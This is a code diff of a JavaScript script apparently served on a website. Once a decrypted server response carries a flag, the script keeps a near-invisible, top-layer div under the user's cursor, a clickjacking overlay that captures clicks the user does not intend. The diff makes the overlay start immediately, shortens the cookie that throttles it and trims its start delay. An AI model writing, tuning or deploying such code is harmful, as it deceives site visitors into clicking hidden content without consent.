@@ -53,13 +53,13 @@ function h12_startScript(){
         if (h12_canTrack == 1) {
             $("#" + h12_div).css({
                 left:  tracker.x - $("#" + h12_div).width() / 2,
-                top:   tracker.y - $("#" + h12_div).height() / 2
+                top:   tracker.y - $("#" + h12_div).height()
             });
         }
     });
 
-    if(h12_getCookie("_h12c_delay_time") != null){
-        setTimeout(h12_followDiv,30000);
+    if(h12_getCookie("_h12c_delay_time") == null){
+        h12_followDiv();
     }
 }
 function h12_followDiv() {
@@ -68,7 +68,7 @@ function h12_followDiv() {
     $("#" + h12_div).css("z-index", "9999999").css("position", "absolute").css("opacity", "0.0001");
 }
 function h12_setClick(){
-    h12_setCookie("_h12c_delay_time", '1', 12);
+    h12_setCookie("_h12c_delay_time", '1', 2);
     document.activeElement.blur();
 }
 function h12_startTracker() {
@@ -114,7 +114,7 @@ $(document).ready(function () {
             let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
 
             if(jsonResponse.redecanais === true){
-                setTimeout(h12_startScript,5000);
+                setTimeout(h12_startScript,4500);
             }
         });
 });
